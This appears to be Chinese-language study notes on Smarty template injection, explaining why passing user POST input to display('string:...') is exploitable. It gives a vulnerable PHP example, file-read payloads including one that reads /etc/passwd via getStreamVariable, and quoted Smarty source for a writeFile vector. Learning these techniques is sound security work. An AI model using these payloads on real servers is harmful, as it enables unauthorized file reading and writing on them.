https://forum.butian.net/share/2262
http://freebuf.com/articles/web/264615.html
##  漏洞原原因
 在 Smarty 中，$smarty->display() 函数通常接收一个文件名作为参数（例如 index.tpl）。但是，Smarty 支持一种特殊的资源类型前缀 string:。  
当你使用 $smarty->display('string:' . $ip) 时，Smarty 不会去寻找文件，而是**直接把 $ip 后面的字符串当作模板源代码**进行解析和编译。
就像这样：
```php
<?php
require_once('./libs/' . 'Smarty.class.php');
$smarty = new Smarty();
$ip = $_POST['data'];
$smarty->display('string:'.$ip);
?>
```
这里把我们输入的`$ip`直接当作模板渲染。这意味着如果用户输入了 Smarty 的特殊标签（例如 {...}），Smarty 引擎会认为这是程序逻辑的一部分并执行它。

## 常见攻击方法 
### 文件读取 {include}标签
 
 {include file='\<filename>'}
### 访问类的静态成员或静态方法
在Smarty模板引擎中，`self`关键字代表当前类本身，通常用于访问类的静态成员或静态方法。

可利用的方法：
1. `getStreamVariable()`读文件:
   payload：
   ```php 
   {self::getStreamVariable("file:///etc/passwd")}`
   ```
   
2. 源代码：
   ```php
   public function getStreamVariable($variable)
{
        $_result = '';
        $fp = fopen($variable, 'r+');
        if ($fp) {
            while (!feof($fp) && ($current_line = fgets($fp)) !== false) {
                $_result .= $current_line;
            }
            fclose($fp);
            return $_result;
        }
        $smarty = isset($this->smarty) ? $this->smarty : $this;
        if ($smarty->error_unassigned) {
            throw new SmartyException('Undefined stream variable "' . $variable . '"');
        } else {
            return null;
        }
    }
//值得注意的是$variable就是我们要传递的文件的路径。
   ```
   这个方法之存在于`Smarty<=3.1.29`的版本，在Smarty 3.1.30版本中官方以及删除这个方法。
3. `writeFile()`方法写文件:
   ```php
   public function writeFile($_filepath, $_contents, Smarty $smarty)
    {
        $_error_reporting = error_reporting();
        error_reporting($_error_reporting & ~E_NOTICE & ~E_WARNING);
        $_file_perms = property_exists($smarty, '_file_perms') ? $smarty->_file_perms : 0644;
        $_dir_perms = property_exists($smarty, '_dir_perms') ? (isset($smarty->_dir_perms) ? $smarty->_dir_perms : 0777)  : 0771;
        if ($_file_perms !== null) {
            $old_umask = umask(0);
        }

        $_dirpath = dirname($_filepath);
        // if subdirs, create dir structure
        if ($_dirpath !== '.' && !file_exists($_dirpath)) {
            mkdir($_dirpath, $_dir_perms, true);
        }

        // write to tmp file, then move to overt file lock race condition
        $_tmp_file = $_dirpath . DS . str_replace(array('.', ','), '_', uniqid('wrt', true));
        if (!file_put_contents($_tmp_file, $_contents)) {
            error_reporting($_error_reporting);
            throw new SmartyException("unable to write file {$_tmp_file}");
       }
   ```
   这个方法是在`class Smarty_Internal_Runtime_WriteFile`下的